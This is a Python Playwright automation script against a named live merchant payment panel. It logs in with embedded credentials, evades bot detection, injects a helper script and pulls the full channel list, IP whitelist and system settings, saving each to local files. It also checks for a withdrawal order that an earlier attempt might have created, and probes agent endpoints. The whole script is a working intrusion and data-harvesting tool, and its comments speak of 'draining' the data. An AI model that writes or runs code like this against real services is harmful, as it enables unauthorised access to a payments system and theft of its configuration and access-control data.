import asyncio, json, os, sys, io
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")

from playwright.async_api import async_playwright

CHROME = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
TARGET = "https://merchant.lamuzhifu.top"
OUT = r"E:\IOSusdt"
PROXY = "http://127.0.0.1:10809"
LOGIN, PASSWD = "\u51a0\u519b", "<REDACTED_PASSWORD>"
PIPE = open(os.path.join(OUT, "pipe.js"), encoding="utf-8").read()


async def do_login(pg):
    await pg.goto(TARGET + "/login", wait_until="commit", timeout=60000)
    for i in range(40):
        await pg.wait_for_timeout(1000)
        try:
            d = await pg.evaluate("""() => ({ w: window.__cx?window.__cx.w:null,
                cxp: window.__cxp||null, n: document.querySelectorAll('input').length })""")
        except Exception:
            continue
        if d and d["w"] == 1 and d["cxp"] == 1 and d["n"] >= 3:
            break
    await pg.wait_for_timeout(2000)
    await pg.evaluate("""async (c) => {
        const set=(el,v)=>{const d=Object.getOwnPropertyDescriptor(el.__proto__,'value');
          d&&d.set?d.set.call(el,v):(el.value=v);
          el.dispatchEvent(new Event('input',{bubbles:true}));
          el.dispatchEvent(new Event('change',{bubbles:true}));};
        const ins=Array.from(document.querySelectorAll('input'));
        const u=ins.find(i=>i.name==='username'||i.type==='text');
        const pw=ins.find(i=>i.name==='password'||i.type==='password');
        const tt=ins.find(i=>i.name==='Totp');
        if(u)set(u,c.u); if(pw)set(pw,c.p); if(tt)set(tt,'');
        await new Promise(r=>setTimeout(r,700));
        const bs=Array.from(document.querySelectorAll('button'));
        const btn=bs.find(x=>/\\u767b\\u5f55/.test(x.innerText))||bs[0];
        if(btn)btn.click(); }""", {"u": LOGIN, "p": PASSWD})
    for i in range(45):
        await pg.wait_for_timeout(1000)
        t = await pg.evaluate("() => localStorage.getItem('merchant-token')||''")
        if t:
            return t
    return ""


async def main():
    async with async_playwright() as p:
        b = await p.chromium.launch(
            headless=False, executable_path=CHROME, proxy={"server": PROXY},
            args=["--ignore-certificate-errors", "--no-sandbox",
                  "--disable-blink-features=AutomationControlled", "--window-size=1920,1080"])
        ctx = await b.new_context(ignore_https_errors=True,
                                  viewport={"width": 1920, "height": 1080},
                                  screen={"width": 1920, "height": 1080})
        pg = await ctx.new_page()
        tok = await do_login(pg)
        if not tok:
            print("[!] login failed"); await b.close(); return
        await pg.wait_for_timeout(3000)
        await pg.add_script_tag(content=PIPE)

        # 1) Confirm no withdrawal side-effect was created
        r = await pg.evaluate("""async (t) => {
            try { return await window.__PIPE.post('/api/WebOrder/ApplyWithdrawalOrders',
                    { Pager:{PageIndex:1,PageSize:50}, Condition:{} }, t); }
            catch(e){ return {err:String(e)}; } }""", tok)
        print("[核查] 提现订单列表:", json.dumps(r, ensure_ascii=False)[:600])

        # 2) Drain the 18 real channels with full detail
        r2 = await pg.evaluate("""async (t) => {
            try { return await window.__PIPE.get('/api/MerchantChannel/List', t); }
            catch(e){ return {err:String(e)}; } }""", tok)
        print("\n[资金通道] 完整列表:")
        if r2.get("data"):
            d = r2["data"].get("Data", {})
            print("  Summary:", json.dumps(d.get("Summary"), ensure_ascii=False))
            for it in (d.get("Items") or []):
                ch = it.get("Channel") or {}
                print(f"  Id={it.get('Id')} ChannelId={it.get('ChannelId')} "
                      f"Code={ch.get('Code')} Name={ch.get('Name')} "
                      f"MerchantId={it.get('MerchantId')} Status={it.get('Status')}")
        json.dump(r2, open(os.path.join(OUT, "channels_full.json"), "w", encoding="utf-8"),
                  ensure_ascii=False, indent=1)

        # 3) Drain the full IP whitelist
        r3 = await pg.evaluate("""async (t) => {
            try { return await window.__PIPE.get('/api/AuthorizedIp/List', t); }
            catch(e){ return {err:String(e)}; } }""", tok)
        print("\n[IP 白名单] 完整列表:")
        if r3.get("data"):
            for it in (r3["data"].get("Data") or []):
                print(f"  Id={it.get('Id')} Ip={it.get('Ip')} OwnerId={it.get('OwnerId')} "
                      f"Owner={it.get('OwnerName')} Comment={it.get('Comment')} "
                      f"Operator={it.get('OperatorName')} Created={it.get('CreatedOn')}")
        json.dump(r3, open(os.path.join(OUT, "iplist_full.json"), "w", encoding="utf-8"),
                  ensure_ascii=False, indent=1)

        # 4) Full system settings
        r4 = await pg.evaluate("""async (t) => {
            try { return await window.__PIPE.get('/api/System/Settings', t); }
            catch(e){ return {err:String(e)}; } }""", tok)
        print("\n[系统设置] 完整:")
        if r4.get("data"):
            for it in (r4["data"].get("Data") or []):
                print(f"  {it.get('Key'):44s} = {str(it.get('Value'))[:60]:60s} {it.get('Title') or ''}")
        json.dump(r4, open(os.path.join(OUT, "settings_full.json"), "w", encoding="utf-8"),
                  ensure_ascii=False, indent=1)

        # 5) Agent endpoints — note the odd "Code 0, ok" with no Data
        for path, tag in [("/api/Agent/Subordinates", "代理下级"),
                          ("/api/Home/Dashboard", "首页仪表盘")]:
            rr = await pg.evaluate("""async (a) => {
                try { return await window.__PIPE.get(a.p, a.t); }
                catch(e){ return {err:String(e)}; } }""", {"p": path, "t": tok})
            print(f"\n[{tag}] {path}:", json.dumps(rr, ensure_ascii=False)[:400])

        print("\n[+] channels_full.json / iplist_full.json / settings_full.json saved")
        await b.close()


asyncio.run(main())
